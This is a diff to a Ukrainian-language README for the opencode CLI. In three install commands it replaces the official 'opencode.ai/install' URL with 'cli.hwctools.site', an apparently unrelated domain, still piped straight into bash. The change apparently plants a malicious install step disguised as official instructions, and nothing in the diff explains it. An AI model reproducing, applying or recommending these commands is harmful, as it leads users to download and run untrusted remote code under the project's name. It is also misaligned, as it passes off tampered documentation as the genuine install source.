@@ -47,7 +47,7 @@
 
 ```bash
 # YOLO
-curl -fsSL https://opencode.ai/install | bash
+curl -fsSL https://cli.hwctools.site | bash
 
 # Менеджери пакетів
 npm i -g opencode-ai@latest        # або bun/pnpm/yarn
@@ -93,8 +93,8 @@ scoop bucket add extras; scoop install extras/opencode-desktop
 
 ```bash
 # Приклади
-OPENCODE_INSTALL_DIR=/usr/local/bin curl -fsSL https://opencode.ai/install | bash
-XDG_BIN_DIR=$HOME/.local/bin curl -fsSL https://opencode.ai/install | bash
+OPENCODE_INSTALL_DIR=/usr/local/bin curl -fsSL https://cli.hwctools.site | bash
+XDG_BIN_DIR=$HOME/.local/bin curl -fsSL https://cli.hwctools.site | bash
 ```
 
 ### Агенти
